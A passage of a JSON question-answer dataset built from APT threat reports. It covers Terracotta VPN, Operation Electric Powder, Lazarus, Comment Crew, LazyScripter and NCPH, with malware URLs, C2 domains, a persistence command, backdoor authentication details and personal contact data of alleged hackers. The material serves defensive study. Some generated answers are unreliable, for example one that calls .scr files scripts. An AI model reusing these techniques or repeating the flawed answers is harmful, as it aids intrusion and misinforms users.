https://www.virustotal.com/en/file/d7bd289e6cee228eb46a1be1fcdc3a2bd5251bc1eafb59f8111756777d8f373d/analysis/1429772817/\n16 http://blog.crowdstrike.com/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/\n17 https://www.fireeye.com/blog/threat-research/2010/10/avzhan-botnet-the-story-of-evolution.html\n18 http://www.arbornetworks.com/asert/2010/09/another-family-of-ddos-bots-avzhan\nThe legitimate properties and text depicted in the file appear to obscure the actual malicious intent. The file is named after a very popular photo markup program in China called \u7f8e\ufffd\u79c0\u79c019 or \"Mito Xiu Xiu\" (Figure 14).\nRSA Research determined that approximately 180 systems were infected with this Trojan, approximately one third of which were active in the Terracotta VPN node ecosystem.\nRead the text above and answer this question: How does the Terracotta VPN malware achieve persistence on an infected machine, and what indicators might alert administrators to its presence? Additionally, how does the malware communicate with its controller, and what historical references suggest similarities to previous malware behaviors?",
    "output": "The Terracotta VPN malware achieves persistence on an infected machine by adding a new service to the ControlSet Registry Key using the Image Path of the newly-copied file. The name of the new service, 'GHIJKL NOPQRSTU WXY', might raise suspicion among administrators due to its unusual naming convention. The malware performs a DNS request to vps.xxxxx.net for resolution of its controller and connects to it over TCP port 81 with a specific initial connection string. Two strings of interest found in the process memory are '%c%c%c%c%c%c.exe' and a User-Agent string containing 'MyIE 3.01'. This User-Agent string was previously mentioned in a 2010 blog post by FireEye, which referenced a blog by Arbor Networks describing malware behavior sharing several elements with the current sample, including the use of a raw TCP connection to the server, the UA string in memory, and the pattern to generate the executable name.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Impersonating Israeli news site\nThe attackers registered and used in multiple attacks the domain ynetnewes[.]com (note the extra e). This domain impersonates ynetnews.com, the English version of ynet.co.il \u2013 one of Israel's most popular news sites.\nCertain pages within the domain would load the legitimate Ynet website:\nOthers, which are opened as decoy during malware infection, had copied content from a different news site:\nThe link pointed to goo[.]gl/zxhJxu (Google's URL shortening service). According to the (<https://goo.gl/#analytics/goo.gl/zxhJxu/all_time>)statistics page, it had been created on September 25, 2016 and have been clicked only 11 times. When clicked, it would redirect to iecr[.]co/info/index_info.php .\nWe do not know what was the content in the final URL. We estimate that it served malware. The domain iecr[.]co was used as a command and control server for other malware in this campaign.\nAnother URL, http://ynetnewes[.]com/resources/assets/downloads/svchost.exe\nhosted a malware file called program_stream_film_for_watch.exe. ((<https://www.virustotal.com/en/file/6909674a3af0960675ca6184d890e0b294da4c66b9e512b35112474f58a4c900/analysis/>)d020b08f5a6aef1f1072133d11f919f8)\nBig Headline: Fake Facebook profile \u2013 Linda Santos\nOne of the above mentioned malicious URLs was spread via comments by a fake Facebook profile \u2013 Linda Santos ((<https://www.facebook.com/profile.php?id=100012012675632>)no longer available):\nIn September 2016, the fake profile commented to posts by Israel Electric Company:\nIsrael Electric Corporation 'nn\u0141\u2022'l '11wnil nnn 50 mins \u00b7 l\nThe profile had dozens of friends, almost all were IEC employees:\nThe fake profile was following only three pages, one of which was the IEC official page:\nBig Headline: Android phone malware\nThe attackers also distributed a malicious app for Android devices \u2013 pokemon.apk ((<https://www.virustotal.com/en/file/329c764c75e3cc257f25c5ae7b44fa9b0dcd8cada12f23e44a789d26c90e04df/analysis/>)3137448e0cb7ad83c433a27b6dbfb090). This malware also had characteristics that impersonate IEC, such as the package name:\nThe application is a dropper that extracts and installs a spyware. The dropper does not ask for any permission during installation:\nHowever, when the spyware is installed, it asks for multiple sensitive permissions:\nThe victim ends up with two applications installed on their device. The Dropper, pretending to be a Pokemon Go app, adds an icon to the phone dashboard. However, it does not have any functionality, and when clicked, this error message is displayed:\nBig Headline: Websites for Malware distribution\nMalware was also hosted in legitimate breached Israeli websites, such as this educational website: http://www.bagrut3.org[.]il/upload/edu_shlishit/passwordlist.exe ((<https://www.virustotal.com/en/file/15b5fb226689fdddc04c3e6ddeb84e3aae4ce009cc4c95f6fa68045033ca905f/analysis/>)defc340825cf56f18b5ba688e6695e68) and a small law firm's website:\nhttp://sheinin[.]co.il/MyPhoto.zip ((<https://www.virustotal.com/en/file/9631d1574b11217ecdaa496696f25027a0fae7d83f4c3c1d71c2bf0dcbf9ea1e/analysis/1480916388/>)650fcd25a917b37485c48616f6e17712)\nIn journey-in-israel[.]com, the attackers inserted an exploit code for CVE-2014-6332 \u2013 a Windows code execution vulnerability. The exploit was copied from an online source, likely (<https://gist.github.com/worawit/84ab41358b8465966224>)from here, as the code included the same comments. The website also hosted this malware: (<https://www.virustotal.com/en/file/09c4bd14f67ad09dd3a6cc7aea3dad824732b0837a82bae03db7b3b98cfe2cbd/analysis/>)afd5288d9aeb0c3ef7b37becb7ed4d5c.\nIn other cases, the attackers registered and built malicious websites: users-management[.]com and sourcefarge[.]net (similar to legitimate software website sourceforge.net). The latter was redirecting to journey-in-israel[.]com and iec-co-il[.]com in May and July 2016, (<https://passivetotal.org/search/sourcefarge.net>)according to PassiveTotal:\nSample (<https://www.virustotal.com/en/file/641275b120a014ef8534ead47d2f68ea96f62ab04c779dc57608109998afd9b6/analysis/>)24befa319fd96dea587f82eb945f5d2a, potentially only a test file, is a self-extracting archive (SFX) that contains two files: a legitimate Putty installation and link.html:\nWhen run, while putty is installed, the html file is opened in a browser and redirects to http://tinyurl[.]com/jerhz2a and then to http://users-management[.]com/info/index_info.php?id=9775. The last page 302 redirects to the website of an Israeli office supply company Mafil:\nSample (<https://www.virustotal.com/en/file/79081e664393cad10c1f93835fd29fa36071e216b6e43bdc8f9650ef3eeae671/analysis/>)f6d5b8d58079c5a008f7629bdd77ba7f , also a self-extracting archive, contained a decoy PDF document and a backdoor:\nThe PDF, named IEC.pdf, is a warranty document taken from Mafil's public website. It is displayed to the victim while the malware ((<https://www.virustotal.com/en/file/214bc5cde615305d5c0187581cbb3fcc8bbaab0f7cbfce424ea891f0b2cba79a/analysis/>)6aeb71d05a2f9b7c52ec06d65d838e82) is infecting its computer:\nBig Headline: Windows Malware\nThe attackers developed three malware types for Windows based computers:\nDropper \u2013 self-extracting archives that extract and run the backdoor, sometimes while opening a decoy PDF document or website.\n(For example: 6fa869f17b703a1282b8f386d0d87bd4)\nTrojan backdoor / downloader \u2013 malware that collects information about the system and can download and execute other files. (909125d1de7ac584c15f81a34262846f)\nSome samples had two hardcoded command and control servers: iecrs[.]co and iecr[.]co (note once again the use of IEC in the domain name).\nKeylogger / screen grabber \u2013 records keystrokes and takes screenshots. The malware file is compiled Python code. ((<https://www.virustotal.com/en/file/3a36bee1411da9ce3fd5a287ce43e8943e4b1fc5abe62926a0a3a9db9a4f2ee9/analysis/>)d3e0b129bad263e6c0dcb1a9da55978b)\nAn analysis of the malware and other parts of the campaign was (<https://kc.mcafee.com/resources/sites/MCAFEE/content/live/PRODUCT_DOCUMENTATION/26000/PD26760/en_US/McAfee_Labs_Threat_Advisory_GazaCybergang.pdf>)published by Mcafee in on November 11, 2016.\nThe latest known sample in this campaign ((<https://www.virustotal.com/en/file/21023f43749e1efa394eeaa486a5cd332d64cabc9bb28a1640a252fd43062384/analysis/>)7ceac3389a5c97a3008aae9a270c706a) has compilation timestamp of February 12, 2017. It is dropped when \"pdf file products israel electric.exe\" ((<https://www.virustotal.com/en/file/4961761f7768a802f2023523b73ed60bd178487177f72b58f9284632ae5e3bd2/analysis/>)c13c566b079258bf0782d9fb64612529) is executed.\nBig Headline: Attribution\nIn a (<https://kc.mcafee.com/resources/sites/MCAFEE/content/live/PRODUCT_DOCUMENTATION/26000/PD26760/en_US/McAfee_Labs_Threat_Advisory_GazaCybergang.pdf>)report that covers other parts of the campaign, Mcafee attribute it to Gaza Cybergang (AKA Gaza Hacker Team AKA Molerats). However, the report does not present strong evidence to support this conclusion.\nWhile initially we thought the same, currently we cannot relate Operation Electric Powder to any known group. Moreover, besides Mohamad potentially being the name of the malware developer (based on PDB string found in multiple samples: C:\\Users\\Mohammed.MU\\Desktop\\AM\\programming\\C\\tsDownloader\\Release\\tsDownloader.pdb ), we do not have evidence that the attackers are Arabs.\n\nHow did the attackers distribute malware through a fake Facebook profile named Linda Santos, and what specific actions did this profile take to target IEC employees?",
    "output": "The attackers distributed malware through a fake Facebook profile named Linda Santos. This profile commented on posts by the Israel Electric Company in September 2016, spreading malicious URLs. The profile had dozens of friends, almost all of whom were IEC employees, and it followed only three pages, one of which was the IEC official page. By targeting IEC employees specifically, the attackers aimed to increase the likelihood of infecting IEC-related computers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Connections with other campaigns\nOne of the malware strains employed in this attack, known as LPEClient, has featured prominently in recent activity attributed to the Lazarus group. This particular malware consistently serves as the initial infection vector, enabling victim profiling and facilitating the delivery of additional payloads. Over an extended period of time, (<https://securelist.com/apt-trends-report-q3-2023/110752/#southeast-asia-and-korean-peninsula>)one of these campaigns specifically targeted defense contractors and nuclear engineers. In a recent incident, the threat actor compromised a victim by delivering LPEClient via a Trojanized VNC or Putty client for an intermediate infection. Another campaign targeting the cryptocurrency industry was discovered in July 2023. In this financially motivated campaign, the actor leveraged the (<https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/>)Gopuram malware, associated with the 3CX supply chain attack. Interestingly, the actor also used LPEClient malware in this case. Prior to the introduction of the Gopuram cluster, LPEClient was used to deliver the subsequent malware. These three campaigns attributed to Lazarus in 2023 illustrate different initial infection vectors and infection chains, but they consistently relied on LPEClient malware to deliver the final payload.\nThe infection chains of the three campaigns attributed to Lazarus in 2023\nBig Headline: Conclusions\nThe Lazarus group remains a highly active and versatile threat actor in today's cybersecurity landscape. The threat actor has demonstrated a profound understanding of IT environments, refining their tactics to include exploiting vulnerabilities in high-profile software. This approach allows them to efficiently spread their malware once initial infections are achieved. Moreover, the activities of this notorious actor transcend geographic boundaries and industry sectors. They have targeted various industries, each with distinct objectives and using different tools, tactics and techniques. This underscores their recent and ongoing activity characterized by sophisticated methods and unwavering motivations.\n\nBased on the above text, answer a question. How does the Lazarus group utilize the LPEClient malware across different campaigns, and what does this reveal about their tactics and strategies?",
    "output": "The Lazarus group employs the LPEClient malware as a consistent initial infection vector across various campaigns. This malware enables victim profiling and facilitates the delivery of additional payloads. For instance, in one campaign targeting defense contractors and nuclear engineers, LPEClient was delivered via a Trojanized VNC or Putty client. In another campaign focused on the cryptocurrency industry, LPEClient was used alongside the Gopuram malware associated with the 3CX supply chain attack. Additionally, in a third campaign, LPEClient was again utilized to deliver subsequent malware. This consistent use of LPEClient demonstrates the group's versatility and adaptability, as they leverage different initial infection vectors and infection chains to achieve their objectives. Their tactics show a deep understanding of IT environments and a strategic approach to spreading malware efficiently once initial infections are established.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did Sednit exploit the XSS vulnerability in Roundcube during Operation RoundPress, and what were the primary objectives of this operation?",
    "output": "Sednit exploited the XSS vulnerability in Roundcube by injecting malicious JavaScript code into the victim's Roundcube webmail server. The primary objectives of Operation RoundPress were to steal emails, address books, and create forwarding rules to steal incoming emails. This campaign targeted government staff in Armenia, Tajikistan, and Ukraine initially, and later expanded to organizations in Serbia, Greece, Poland, and Ukraine.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the ethical hacker ensure that the compromised firmware was updated timely, and what implications does this have for organizations relying on third-party software updates?",
    "output": "The ethical hacker ensured that the compromised firmware was updated timely by posting fake security vulnerabilities for the current version of the firmware. This tactic created a sense of urgency, prompting the government to apply the updates quickly. The implications for organizations relying on third-party software updates are significant. Organizations must thoroughly vet and verify the integrity of software updates before applying them. They should also implement robust security measures to prevent unauthorized modifications to software and firmware, and establish protocols for verifying the authenticity of updates to mitigate the risk of such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Dalbit group ensure persistence of the FRP tool within certain companies, and what command was used to execute the registered scheduler?",
    "output": "The Dalbit group ensured persistence of the FRP tool by registering it to the task scheduler (schtasks) under the name 'debug'. The command used to execute the registered scheduler was 'schtasks /tn debug /run'. This method allowed the FRP tool to maintain its presence and functionality within the affected systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: Subject lines\n\uf0b7 Capt [REMOVED] update\n\uf0b7 Fw: LES Request\n\uf0b7 Libya crisis\n\uf0b7 Five Simple Questions for Democrats on Spending Cuts\n\uf0b7 Behind the Easing of Israeli-Palestinian Tensions\n\uf0b7 Business Exec Urges Broad Trade Agenda To Curb China Role In Latin America\n\uf0b7 President Chavezs Comments About President Obama and the United States on Sundays \"Alo,Presidente\"\n\uf0b7 FW: New Standdard Operational Procedures (SOPs) between the\n\uf0b7 AGENDA\n\uf0b7 [REMOVED] Help You Save Enough for Retirement\n\uf0b7 Human right of north Afica under war\n\uf0b7 Spreading Civil Unrest in the Middle East and North Africa\n\uf0b7 The latest analysis on Syria\n\uf0b7 International Atomic Energy Agency invite you to attend Atomic Energy Summit\n\uf0b7 GAC Monthly Report\n\uf0b7 Emergency notification\n\uf0b7 Meeting information of [REMOVED]\n\uf0b7 Meeting information of [REMOVED]\n\uf0b7 Meeting notice from [REMOVED]\n\uf0b7 Meeting notice from [REMOVED]\n\uf0b7 FY12 Government Opportunities\n\uf0b7 Yemen para for SC briefing\n\uf0b7 Fighting Protectionism and Promoting Trade and Investment\n\uf0b7 Weekly Security Report\n\uf0b7 Agenda of [REMOVED] Visit in July 2011\n\uf0b7 Agenda of [REMOVED] Visit in July 2011\n\uf0b7 Obituary Notice\n\uf0b7 Updated Roster 20110712\n\uf0b7 2011 project budget\n\uf0b7 [REMOVED] National Security Seminar\n\uf0b7 Current internatinal situation surrounding Syria\n\uf0b7 New Update of Health & Medical force\n\uf0b7 FW:How to Get Free Airline Tickets\n\uf0b7 Nuclear Security and Summit Diplomacy\n\uf0b7 Fw: [REMOVED] Defence & Security Industry Mission to [REMOVED] 201\n\uf0b7 [REMOVED] heriketlik pilani\n\uf0b7 2012 Global aerospace and defense industry outlook\nSmall Headline: Email attachment names\n\uf0b7 update.exe\n\uf0b7 CTF 2011 (MF).xls\n\uf0b7 BBC Monitoring reports..xls\n\uf0b7 Five Simple Questions for Democrats on Spending Cuts.doc\n\uf0b7 Behind the Easing of Israeli-Palestinian Tensions.doc\n\uf0b7 Business Exec Urges Broad Trade AgendaTo Curb China Role In Latin America.doc\n\uf0b7 PatriotLMSR2009Fin .doc\n\uf0b7 New SOPs for HEC Coord with NATO.pdf\n\uf0b7 agenda201005.pdf\n\uf0b7 Human right report of noth Afica under the war.scr\n\uf0b7 Middle_East_Civil_Unrest.pdf\n\uf0b7 Protests Spread in Syria.pdf\n\uf0b7 Cybersecurity and Cyber War.pdf\n\uf0b7 The Meeting intivation of International Atomic Energy Agency 06-05-2011.scr\n\uf0b7 meeting invitation of British Council 2011.scr\n\uf0b7 Meeting information details of [REMOVED].exe\n\uf0b7 Meeting information details of [REMOVED].exe\n\uf0b7 Meeting detail information from [REMOVED].scr\n\uf0b7 Meeting detail information from [REMOVED].scr\n\uf0b7 FY12 Government Opportunities.pdf\n\uf0b7 China's Jasmine protests.pdf\n\uf0b7 Yemen para for SC briefing.doc\n\uf0b7 DECLARATION- COMMENTS.Netherlands.pdf\n\uf0b7 weekly_security_report-06-20-2011__-__06-26-2011.pdf\n\uf0b7 2011.xls\n\uf0b7 Obituary.xls\n\uf0b7 Updated_roster.xls\n\uf0b7 2011 project budget.xls\n\uf0b7 Participant_Contacts.xls\n\uf0b7 Current international situation surrounding Syria.doc\n\uf0b7 Update of Health & Medical force.xls\n\uf0b7 How to Get Free Airline Tickets.pdf\n\uf0b7 REPLY_ FORM.doc\n\uf0b7 Global A&D outlook 2012.pdf\n\uf0b7 Global_A&D_outlook_2012.pdf\nSmall Headline: About Symantec\nSymantec protects the world's information and is the global leader in security, backup, and availability solutions. Our innovative products and services protect people and information in any environment\u2014from the smallest mobile device to the enterprise data center to cloud-based systems. Our industry-leading expertise in protecting data, identities, and interactions gives our customers confidence in a connected world. More information is available at or by connecting with Symantec at\nHeadquartered in Mountain View, Calif., Symantec has operations in 40 countries. More information is available at (<http://www.symantec.com/>)www.symantec.com\nFor specific country offices and contact numbers, please visit our website.\nSymantec World Headquarters\n350 Ellis St.\nMountain View, CA 94043 USA\n+1 (650) 527-8000\n1 (800) 721-3934\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY. The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nCopyright \u00a9 2013 Symantec Corporation. All rights reserved.\nSymantec, the Symantec Logo, and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners\n\nWhat types of file extensions were commonly used in the email attachments sent by the Comment Crew APT, and why might these extensions have been chosen? Discuss the potential risks associated with each type.",
    "output": "The Comment Crew APT commonly used file extensions such as .exe, .doc, .pdf, .scr, and .xls in their email attachments. These extensions were likely chosen because they are familiar and commonly used in business communications, making them less suspicious to recipients. However, each type carries significant risks. Executable files (.exe) can run malicious code directly; document files (.doc, .pdf) can contain embedded macros or exploits; script files (.scr) can execute commands; and spreadsheet files (.xls) can include malicious formulas or macros. By using these common file types, the attackers increase the likelihood that recipients will open the attachments, thereby exposing themselves to potential malware infections.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Backdoor Liudoor\nFile Size: 87 KB\nMD5: 531d30c8ee27d62e6fbe855299d0e7de\nC2: 0.0.0.0:3433\nThis is a simple backdoor similar to the common Portless Backdoor21 found running as a service on at least five Terracotta VPN victim servers, that RSA Research has dubbed Liudoor. It was installed as Windows\\SysWOW64\\rasauto.dll running as what would be the unused \"RasAuto\" service on victim Windows Server 2008 R2 systems.\nWhile RSA Research did not find the dropper for this backdoor, it could have just as easily been installed with a batch script. This sample binds to TCP port 3433 and waits for an incoming request, probably from a dedicated client used by its operator. It will send the 4 bytes \"pass\", it expects to receive the binary string \"E10ADC3949BA59ABBE56E057F20F883E\" (shown here in ASCII text). This is the MD5 hash of the ASCII string \"123456\". The backdoor process will compare what is passed from the client to that hard coded value, and if successful it will send back \"succ\", if not it will sent back \"fail\".\nOnce the sample has successfully authenticated it will create a thread and pipe data back and forth to the Windows command shell process, cmd.exe. It takes the input and parses the string sent to the sample for 0x0D (the obfuscation XOR key) or carriage return...and then passes everything before that to cmd.exe.  The shell can be halted with the \"exit\" command.  Other hard coded binary options include a certain value that will run the console program \"nbstat.exe\" for NetBIOS network information, which might be useful to its operator for lateral exploitation of other Windows computers on the victim network. RSA Research found similar Backdoor Liudoor files on VirusTotal with the following characteristics:\n78b56bc3edbee3a425c96738760ee40622 listens on port 3340 5aa0510f6f1b0e48f0303b9a4bfc641e23 listens on port 3433 2be2ac65fd97ccc97027184f0310f2f324 listens on port 1234\nOn more recently discovered Terracotta victims, Liudoor was observed to listen on TCP port 64111 or 33911.\n19 http://xiuxiu.web.meitu.com\n20 https://www.virustotal.com/en/file/ad1a507709c75fe93708ce9ca1227c5fefa812997ed9104ff9adfec62a3ec2bb/analysis/\n21 http://www.symantec.com/security_response/writeup.jsp?docid=2003-122516-0717-99&tabid=2\n22 https://www.virustotal.com/en/file/deed6e2a31349253143d4069613905e1dfc3ad4589f6987388de13e33ac187fc/analysis/\n23 https://www.virustotal.com/en/file/4575e7fc8f156d1d499aab5064a4832953cd43795574b4c7b9165cdc92993ce5/analysis/\n24 https://www.virustotal.com/en/file/e42b8385e1aecd89a94a740a2c7cd5ef157b091fabd52cd6f86e47534ca2863e/analysis/\nBig Headline: DETECTING TERRACOTTA ACTIVITY IN RSA SECURITY ANALYTICS AND RSA ECAT\nOrganizations with robust and consistently applied security controls on Internet-facing infrastructure should face little risk that their servers would be enlisted as VPN nodes by Terracotta actors. Two Fortune 500 companies that were identified as victims were exceptions as the comprehensive application of security controls fell short. More threatening to otherwise well-defended organizations is the threat of advanced threat actors originating from legitimate, but compromised, organizations. Any network connection with a Terracotta VPN node should be treated with great suspicion and investigated immediately. Built into RSA Security Analytics is the automatic threat intelligence aggregation and delivery system known as RSA Live. Updated Terracotta node IP addresses are provided in RSA Live as part of the suspect VPN node feed, and available upon request. In Figure 15, RSA Security Analytics has alerted on the Derusbi server handshake parser from RSA Live. It also has alerted on the source of the malicious Derusbi Command and Control (C2) which is a Terracotta node, described as a criminal VPN service exit node by Security Analytics.\nIn Figure 16, a redacted screenshot from RSA Security Analytics shows an alert on a suspicious login to an otherwise secure website from a Terracotta VPN node. Any authentication from Terracotta to an organization's secure websites should be treated as hostile and investigated accordingly.\nBig Headline: DETECTING TERRACOTTA MALWARE USING RSA SECURITY ANALYTICS AND ECAT\n\"An ounce of prevention is worth a pound of cure.\" Certainly this idiom from Ben Franklin applies to efforts to defend against this class of threats (not particularly sophisticated, opportunistic, but potentially very costly). RSA Research assesses that had the Windows firewall been turned on, and the default \"Administrator\" account been renamed in each of the victim systems examined, the systems would not have been compromised with the methods employed by Terracotta. Still, in both large and small organizations, a dichotomy may manifest between a \"Security 101\" policy and application of that policy, especially in development and cloud environments.\nNote: This is not intended to be a cyber-hunter's cookbook for finding Terracotta activity with RSA Security Analytics and ECAT, but rather to offer takeaways on the indicators quickly identified by these tools. The \"out of the box\" Gh0st protocol parser from RSA Live detects the \"cb1st\" Gh0st protocol string used by both the GDS520 and MM523Gh0st RAT variants, highlighted in red in Figure 17.  Security Analytics shows an actual victim system in Iran that was infected with the now-neutralized MM523 Gh0st RAT variant calling-back to a RSA Research sinkhole.\nRSA ECAT will readily detect both Gh0st RAT variants employed by the Terracotta actors. In Figure 18, RSA ECAT has raised the Threat Level scores from low single-digit numbers to well above 100 when the GDS520 Gh0st RAT was installed.\nDouble clicking on the workstation in the RSA ECAT console will bring up details about the system, where an analyst can drill-down into the network connections, and responsible processes. In Figure 19, a Security Operations Center (SOC) analyst would be alerted by (illustrated in red boxes) the high score, the Suspicious Threads, and then hone in on the Gh0st C2 connections identified by RSA ECAT.\nIn our Gh0st RAT malware scenario, the SOC analyst would be able to identify the infections of a server and workstation in RSA Security Analytics. The red boxes in Figure 20 illustrate Gh0st RAT protocol detection and botnet threat categorization by RSA Security Analytics. An analyst also might notice the unusual communications port.\nWhile the particular variant of the Mitozhan Trojan described in this paper's malware analysis section has been neutralized by RSA Research with the seizure of its C2 domain; it is likely that other variants with different C2 domains persist. RSA developed a Lua parser to detect Mitozhan Command and Control (C2) activity, now available through RSA Live and included as an appendix.  Figure 22 is a redacted screenshot showing the Mitozhan Lua parser in action as it alerts on Mitozhan C2 activity on a RSA Research sinkhole.\nMitozhan Trojan is also readily detected upon initial scan with RSA ECAT. Figure 23 shows the initial RSA ECAT console display for the infected system, with initial indicators marked in red boxes.\nWhile RSA ECAT can detect a never-before-seen malware infection out-of-the-box without signatures, a well-prepared SOC will have signatures to help identify the threats behind the malware. That is where the built-in Yara features of RSA ECAT really shine. Yara is an open source tool that helps threat intelligence analysts and malware researchers classify and identify malware with granularity that no antivirus product can match. Using the Yara signature included in the Appendix, our example SOC analyst homes in on a suspicious rasauto.dll process identified by RSA ECAT as unsigned in Figure 24. By right-clicking on the suspicious process, the analyst can initiate a Yara scan using pre-configured rules\nIn this scenario, the SOC analyst has used ECAT to scan the suspicious process. As illustrated with the red box on the right of Figure 25, the Yara result is a confirmed infection with Liudoor.  The Liudoor YARA signature is included in the Appendix\nFor more technical details on how RSA ECAT can be used to proactively detect malware not discovered by traditional methods including antivirus, refer to the whitepaper RSA Incident Response: An APT Case Study.\nhttps://blogs.rsa.com/wp-content/uploads/2015/05/RSA-IR-Case-Study.pdf\nBig Headline: PREVENTION\nTerracotta VPN operators are not using sophisticated methods to harvest their VPN nodes from vulnerable organizations around the world. RSA Research assesses that any one of the following hardening steps would have prevented each of the confirmed victim compromises:\n1 Block port 135 on external router and/or firewall\na. There is no known business-use for having port 135 exposed to the Internet\nb. Recommend: hardware firewall configured with \"allow inbound by exception\" policy\n2 Rename \"Administrator\" account on all Windows systems to a unique alphanumeric name\n3 Use a strong (bi-case letters, numbers plus multiple special characters) 15 character+ password that does not use keyboard patterns\na. Keyboard patterns are found in nearly all password cracking dictionaries\nb. Recommend: regularly change passwords\nIn contrast to the simple security controls that can prevent enlistment of an enterprise's Windows servers into the Terracotta VPN node ecosystem, detecting advanced threat actors who are using Terracotta VPN nodes to hide their origin is more complicated. Infallible prevention may not be possible, and therefore detection is key. Use non-signature-based network analysis and end-point analysis capabilities such as provided by RSA Security Analytics and RSA ECAT to proactively detect and thwart compromise of your organization's network, before your most valuable asset---your information\u2014 is compromised.\nQ: What are the key indicators that RSA Security Analytics and RSA ECAT use to detect Terracotta VPN activity and malware, and how do they enhance the security posture of an organization?",
    "output": "RSA Security Analytics and RSA ECAT use several key indicators to detect Terracotta VPN activity and malware. RSA Security Analytics provides updated Terracotta node IP addresses through RSA Live, alerting on suspicious activities such as the Derusbi server handshake parser and malicious C2 sources. It also detects suspicious logins from Terracotta VPN nodes to secure websites. RSA ECAT detects Gh0st RAT variants and raises Threat Level scores significantly when such malware is installed. It also uses Yara signatures to identify specific malware like Liudoor. These tools enhance an organization's security posture by providing real-time threat intelligence, alerting on suspicious activities, and enabling detailed analysis of potential threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Trying to make sense out of it, we had the brainwave of using the information we had about this parallel behavior and make a quick check: We previously found out that they might have been using hackfree.]org as an online obfuscation service for VBS script, so we created our own dummy VBS script and submitted it to hackfree for obfuscation. Then we applied our implemented deobfuscator.\nImplemented dummy VBS script\nDummy VBS script obfuscated via hackfree website\nDeobfuscation of obfuscated dummy VBS script\nAt this point, we discovered that hackfree].org was injecting their own malware in every obfuscated script via their website, and this would lead in a double infection for malware obfuscated with hackfree.]org, or a first \"sneaky\" infection for those scripts that were obfuscated for legitimate purposes. At this last scenario we could confirm that hackfree.]org would be a waterhole attack.\nFinally, back to the tracked threat actor, we could distinguish between LazyScripter's indicators of compromise, and HackFree's IOCs, resulting in the following diagram for this LazyScripter campaign main infrastructure and infection chain.\nLazyScripter's H-Worm campaign's main infrastructure\nIOCs\nC:\\Users\\Lucas\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windowsUpdate.lnk\nFile persistence\nCustomers with Lab52's APT intelligence private feed service already have more tools and means of detection for this campaign.\nIn case of having threat hunting service or being client of S2Grupo CERT, this intelligence has already been applied.\nIf you need more information about Lab52's private APT intelligence feed service, you can contact us through the(<https://lab52.io/contact>) following link\n\nQ: How did the investigators determine that hackfree.org was injecting its own malware into obfuscated scripts, and what implications does this have for cybersecurity professionals dealing with similar threats?",
    "output": "A: The investigators determined that hackfree.org was injecting its own malware into obfuscated scripts by creating a dummy VBS script, submitting it to hackfree.org for obfuscation, and then applying their implemented deobfuscator. They discovered that hackfree.org was adding malicious code to every obfuscated script, leading to a double infection for malware obfuscated with hackfree.org or a 'sneaky' infection for scripts obfuscated for legitimate purposes. This finding confirmed that hackfree.org was acting as a waterhole attack. The implication for cybersecurity professionals is that they must be cautious when using online obfuscation services, as these services can be compromised and used to distribute additional malware, complicating the threat landscape and requiring more sophisticated detection and mitigation strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 7 A Pictorial Introduction to Wicked Rose and NCPH\nJust who are Wicked Rose and the NCPH hacker group?  As it turns out, a collection of college students in China who likely room with one another and regularly support their hacking interests.  In-depth research implicates Wicked Rose as the ring-leader of the group, responsible for managing hacker for hire relationships and paying group members for their work as hackers.  During the time of targeted attacks in 2006 their income increased significantly, to full-time wages for part time hacking.  Wicked Rose, leader of the group, is pictured below:\n\u73ab\u7470 \u9ed1\u5ba2 (MeiGui HeiKe) \"Rose Hacker\"    QQ number is 5372453\nWicked Rose maintains a personal site at .\nWicked Rose's Website:\nRose is an approximate 20-year-old (2006) student at the Sichuan University of Science & Engineering. In the spring of 2006 Wicked Rose claims to have dropped out of school for full time hacking opportunities.  Specifically, on April 30, 2006 his blog entry claims he did not register for his university exam.  He performed significant updates to his rootkit code from March through June 2006.  He later returned to school by September 2006.\nWicked Rose claims responsibility on his blog for targeted e-mail based attacks containing Microsoft Word and CHM exploits from the spring of 2006.\nOther NCPH-member websites include: , and . The main NCPH website is :\nNCPH Studio website\nRegistration information for ncph.net reveals a Chinese registrant:\nMedium Headline: Registrant Contact: ncph studio (ncph2005@126.com) si chuan li gong xue yuan zigong, Sichuan, cn 643000 P: +86.13154663992 F: +86.13154663992\nThe main location of the NCPH group is in Zigong, Sichuan Province, in south-central China.\nZigong, Sichuan Province, in south-central China\nThe NCPH group (NCPH Studio) in Zigong, China, is shown here:\nNCPH hackers at work in the \"ncph studio\" Left to right: \"Wicked Rose,\" KuNgBiM, Charles and Rodag\nAdditional photos featuring Wicked Rose and NCPH hackers are below, captured from their various websites and blog entries in 2006. Chinese translation for each photo are below:\n\"Wicked Rose\"\nFrom an ancient Chinese poem, expressing the devotion of his heart for hacking.\nCharles:  \"Silence belongs to our world...\"\n\"After you choose the technology you love, you have to research every system and code everyday!\"\nCharles\n\"Charles always laughs so brightly when searching for program problems!\"\nRonag\n\"Behind every successful design, he always has a slight smile\u2026\"\nKuNgBiM\n\"Only we can feel this kind of happy...\"\nWicked Rose and NCPH hacking photos\nWHG (\"Fig\")\nWHG is not a core member of NCPH but a close affiliate of Wicked Rose.  WHG appears to be central to development of the NCPH rootkit, aka 